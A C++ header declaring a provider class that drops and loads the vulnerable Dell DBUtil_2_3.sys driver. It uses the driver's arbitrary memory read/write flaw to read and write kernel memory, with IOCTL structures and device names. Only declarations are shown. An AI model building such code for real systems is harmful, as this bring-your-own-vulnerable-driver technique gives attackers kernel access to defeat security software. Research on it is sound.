/**
 * @file DBUtilProvider.h
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the declaration of the DBUtilProvider class.
 *
 * The DBUtilProvider class is a concrete implementation of the IProvider
 * interface for the vulnerable Dell DBUtil_2_3.sys driver. It handles
 * loading, communicating with, and unloading the driver to perform
 * kernel memory operations.
 */

#pragma once

#include "IProvider.h"
#include <string>
#include <Windows.h>

namespace KernelMode {
    namespace Providers {
        /**
         * @class DBUtilProvider
         * @brief Implements the IProvider interface for the DBUtil_2_3.sys driver.
         *
         * This class uses the arbitrary memory read/write vulnerability in
         * DBUtil_2_3.sys to achieve kernel memory primitives.
         */
        class DBUtilProvider : public IProvider {
        public:
            DBUtilProvider();
            ~DBUtilProvider() override;

            bool Initialize() override;
            void Deinitialize() override;

            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;

        private:
            /**
             * @struct DBUtilMemoryRead
             * @brief Structure for the memory read IOCTL request to DBUtil.
             */
            #pragma pack(push, 1)
            struct DBUtilMemoryRead {
                uintptr_t Address;
                DWORD Offset;
                DWORD Value; // Read result
            };
            #pragma pack(pop)
            
            /**
             * @struct DBUtilMemoryWrite
             * @brief Structure for the memory write IOCTL request to DBUtil.
             */
            #pragma pack(push, 1)
            struct DBUtilMemoryWrite {
                uintptr_t Address;
                DWORD Offset;
                BYTE Value[1]; // Value to write
            };
            #pragma pack(pop)

            /**
             * @brief Extracts the embedded driver resource to a temporary file.
             * @return True if extraction is successful, false otherwise.
             */
            bool DropDriver();

            HANDLE deviceHandle;
            SC_HANDLE serviceHandle;
            std::wstring driverPath;
            const std::wstring deviceName = L"\\\\.\\DBUtil_2_3";
            const std::wstring serviceName = L"DBUtil_2_3";
            const std::wstring driverFileName = L"DBUtil_2_3.sys";
        };
    }
}